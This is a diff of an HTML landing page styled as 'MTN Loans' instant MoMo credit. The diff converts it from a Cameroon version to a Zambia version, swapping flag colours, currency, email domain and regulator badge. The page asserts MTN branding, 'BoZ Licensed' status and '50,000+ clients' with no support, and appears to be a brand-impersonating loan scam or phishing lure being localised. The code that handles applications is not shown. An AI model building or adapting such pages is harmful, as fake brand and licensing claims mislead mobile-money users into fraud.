@@ -1,15 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>MTN  – Instant Credit on MoMo</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes" />
+    <title>MTN Loans – Instant Credit on MoMo</title>
 
     <!-- Fonts & Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
 
     <style>
+        /* ── Reset & Variables ── */
         * {
             margin: 0;
             padding: 0;
@@ -25,10 +26,11 @@
             --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
             --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
             --border-radius: 20px;
-            /* Cameroon flag colors */
-            --cm-green: #007A5E;
-            --cm-red: #CE1126;
-            --cm-yellow: #FCD116;
+            /* Zambia flag colors */
+            --zm-green: #198A00;
+            --zm-red: #DE2010;
+            --zm-orange: #EF7D00;
+            --zm-black: #000000;
         }
 
         body {
@@ -45,7 +47,7 @@
             padding: 0 16px;
         }
 
-        /* ===== HEADER ===== */
+        /* ── Header ── */
         .header {
             text-align: center;
             margin-bottom: 24px;
@@ -77,7 +79,7 @@
             margin-right: 4px;
         }
 
-        .logo-text .- {
+        .logo-text .loans {
             color: var(--mtn-black);
         }
 
@@ -99,7 +101,7 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
-        /* ===== LOADING OVERLAY ===== */
+        /* ── Loading Overlay ── */
         .loading-overlay {
             position: fixed;
             inset: 0;
@@ -126,7 +128,7 @@
             }
         }
 
-        /* ===== MAIN CARD ===== */
+        /* ── Main Card ── */
         .main-card {
             background: white;
             border-radius: var(--border-radius);
@@ -143,7 +145,7 @@
             box-shadow: var(--shadow-hover);
         }
 
-        /* Cameroon flag stripe */
+        /* Zambia flag stripe */
         .main-card::before {
             content: '';
             position: absolute;
@@ -152,14 +154,16 @@
             right: 0;
             height: 5px;
             background: linear-gradient(90deg,
-                    var(--cm-green) 0%,
-                    var(--cm-green) 25%,
-                    var(--cm-red) 25%,
-                    var(--cm-red) 50%,
-                    var(--cm-yellow) 50%,
-                    var(--cm-yellow) 75%,
-                    var(--mtn-yellow) 75%,
-                    var(--mtn-yellow) 100%
+                    var(--zm-green) 0%,
+                    var(--zm-green) 20%,
+                    var(--zm-red) 20%,
+                    var(--zm-red) 40%,
+                    var(--zm-black) 40%,
+                    var(--zm-black) 60%,
+                    var(--zm-orange) 60%,
+                    var(--zm-orange) 80%,
+                    var(--zm-green) 80%,
+                    var(--zm-green) 100%
                 );
             border-radius: var(--border-radius) var(--border-radius) 0 0;
         }
@@ -234,7 +238,7 @@
             transform: translateY(-2px);
         }
 
-        /* CTA Button */
+        /* ── CTA Button ── */
         .btn-apply {
             width: 100%;
             padding: 16px;
@@ -266,7 +270,7 @@
             transform: translateX(4px);
         }
 
-        /* Trust badges */
+        /* ── Trust Section ── */
         .trust-section {
             background: white;
             border-radius: var(--border-radius);
@@ -336,6 +340,7 @@
             border-top: 1px solid #eee;
         }
 
+        /* ── Footer ── */
         .footer {
             text-align: center;
             margin-top: 8px;
@@ -350,6 +355,7 @@
             font-weight: 600;
         }
 
+        /* ── Responsive ── */
         @media (max-width: 420px) {
             .logo-text {
                 font-size: 1.6rem;
@@ -363,29 +369,33 @@
 <body>
 
     <div class="container">
-        <!-- Header with Cameroon flag -->
+
+        <!-- ─── HEADER ─── -->
         <div class="header">
             <div class="logo">
                 <div class="logo-text">
-                    <span class="mtn">MTN</span><span class="-"> </span>
+                    <span class="mtn">MTN</span>
+                    <span class="loans">Loans</span>
                 </div>
             </div>
             <div class="tagline">
-                <img class="flag-small" src="https://flagcdn.com/w40/cm.png" alt="Cameroon flag">
-                Instant credit sent to your MTN MoMo wallet
+                <img class="flag-small" src="https://flagcdn.com/w40/zm.png" alt="Zambia flag" />
+                Instant loan sent directly to your MTN MoMo wallet
             </div>
         </div>
 
-        <!-- Loading overlay -->
+        <!-- ─── LOADING OVERLAY ─── -->
         <div class="loading-overlay" id="loadingOverlay">
             <div class="simple-spinner"></div>
         </div>
 
-        <!-- Main card -->
+        <!-- ─── MAIN CARD ─── -->
         <div class="main-card">
             <div class="loan-label">Your instant credit limit</div>
-            <div class="loan-amount-display">XAF 1,000 – 300,000</div>
-            <p class="loan-subtext">Funds sent directly to MTN MoMo • Service fee 8.9% (prorated) • Approval in 5 minutes</p>
+            <div class="loan-amount-display">K 100 – 15,000</div>
+            <p class="loan-subtext">
+                Funds sent directly to MTN MoMo &bull; Service fee 8.9% (prorated) &bull; Approval in 5 minutes
+            </p>
 
             <div class="features">
                 <div class="feature"><i class="fas fa-bolt"></i> Instant disbursement</div>
@@ -395,28 +405,29 @@
             </div>
         </div>
 
-        <!-- CTA Button -->
+        <!-- ─── CTA ─── -->
         <button class="btn-apply" id="applyBtn">
             Continue with MTN MoMo <i class="fas fa-arrow-right"></i>
         </button>
 
-        <!-- Trust badges -->
+        <!-- ─── TRUST SECTION ─── -->
         <div class="trust-section">
-            <div class="trust-title">Approved by Cameroonians</div>
+            <div class="trust-title">Approved by Zambians</div>
             <div class="trust-badges">
                 <div class="trust-badge"><i class="fas fa-lock"></i> SSL Secure</div>
-                <div class="trust-badge"><i class="fas fa-certificate"></i> BEAC Licensed</div>
+                <div class="trust-badge"><i class="fas fa-certificate"></i> BoZ Licensed</div>
                 <div class="trust-badge"><i class="fas fa-shield-alt"></i> Data Protection</div>
                 <div class="trust-badge"><i class="fas fa-users"></i> 50,000+ clients</div>
             </div>
-            <div class="trust-note">⭐ Over 50,000 loans granted across Cameroon ⭐</div>
+            <div class="trust-note">⭐ Over 50,000 loans granted across Zambia ⭐</div>
         </div>
 
-        <!-- Footer -->
+        <!-- ─── FOOTER ─── -->
         <div class="footer">
-            <p>© 2026 MTN  – Powered by MTN Mobile Money</p>
-            <p>Need help? <a href="mailto:support@mtn.cm">support@mtn.cm</a></p>
+            <p>&copy; 2026 MTN Loans &ndash; Powered by MTN Mobile Money</p>
+            <p>Need help? <a href="mailto:support@mtn.co.zm">support@mtn.co.zm</a></p>
         </div>
+
     </div>
 
     <script>
@@ -434,9 +445,13 @@
 
             applyBtn.addEventListener('click', startApplication);
 
-            // Ensure overlay hidden on page load / back navigation
-            window.addEventListener('load', () => { overlay.style.display = 'none'; });
-            window.addEventListener('pageshow', () => { overlay.style.display = 'none'; });
+            // Hide overlay on load / back navigation
+            window.addEventListener('load', function() {
+                overlay.style.display = 'none';
+            });
+            window.addEventListener('pageshow', function() {
+                overlay.style.display = 'none';
+            });
         })();
     </script>
 
